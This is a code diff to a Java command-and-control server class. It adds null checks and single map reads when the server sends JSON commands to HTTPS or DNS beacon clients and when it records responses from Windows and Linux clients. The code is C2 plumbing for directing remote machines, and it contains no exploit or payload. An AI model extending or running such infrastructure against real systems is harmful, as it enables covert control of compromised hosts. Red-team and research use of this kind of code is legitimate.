@@ -205,16 +205,28 @@ public class C2Server implements Runnable{
             commandJSON.put("scope", clientIP);
             commandJSON.put("command", command);
 
-            if (beaconClientHttpsMap.keySet().contains(clientIP)){
-                if((System.currentTimeMillis() - clientLastSeen.get(clientIP).getTime()) < 300000){
-                    longRangeBeacons.get(beaconClientHttpsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
+            // Try HTTPS first. Read each map once and null-check: the client may be
+            // absent from a map, or its beacon may have disconnected, since these maps
+            // are updated concurrently by the beacon threads.
+            String httpsBeaconIP = beaconClientHttpsMap.get(clientIP);
+            if (httpsBeaconIP != null){
+                Time lastSeen = clientLastSeen.get(clientIP);
+                C2ServerBeaconHandler beacon = longRangeBeacons.get(httpsBeaconIP);
+                if (lastSeen != null && beacon != null &&
+                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
+                    beacon.sendToBeacon(commandJSON.toString());
                     // Reached this client over HTTPS; skip the DNS fallback and move to the next match
                     continue;
                 }
             }
-            if (beaconClientDnsMap.keySet().contains(clientIP)){
-                if((System.currentTimeMillis() - dnsClientLastSeen.get(clientIP).getTime()) < 300000){
-                    longRangeBeacons.get(beaconClientDnsMap.get(clientIP)).sendToBeacon(commandJSON.toString());
+            // Fall back to DNS
+            String dnsBeaconIP = beaconClientDnsMap.get(clientIP);
+            if (dnsBeaconIP != null){
+                Time lastSeen = dnsClientLastSeen.get(clientIP);
+                C2ServerBeaconHandler beacon = longRangeBeacons.get(dnsBeaconIP);
+                if (lastSeen != null && beacon != null &&
+                    (System.currentTimeMillis() - lastSeen.getTime()) < 300000){
+                    beacon.sendToBeacon(commandJSON.toString());
                 }
             }
         }
@@ -305,11 +317,17 @@ public class C2Server implements Runnable{
         String os = getClientOS(IPAddress);
         if(os.equals("Windows")){
             synchronized(windowsClientResponses){
-                windowsClientResponses.get(IPAddress).add(Response);
+                ArrayList<String> responses = windowsClientResponses.get(IPAddress);
+                if(responses != null){
+                    responses.add(Response);
+                }
             }
         } else if(os.equals("Linux")){
             synchronized(linuxClientResponses){
-                linuxClientResponses.get(IPAddress).add(Response);
+                ArrayList<String> responses = linuxClientResponses.get(IPAddress);
+                if(responses != null){
+                    responses.add(Response);
+                }
             }
         }
     }
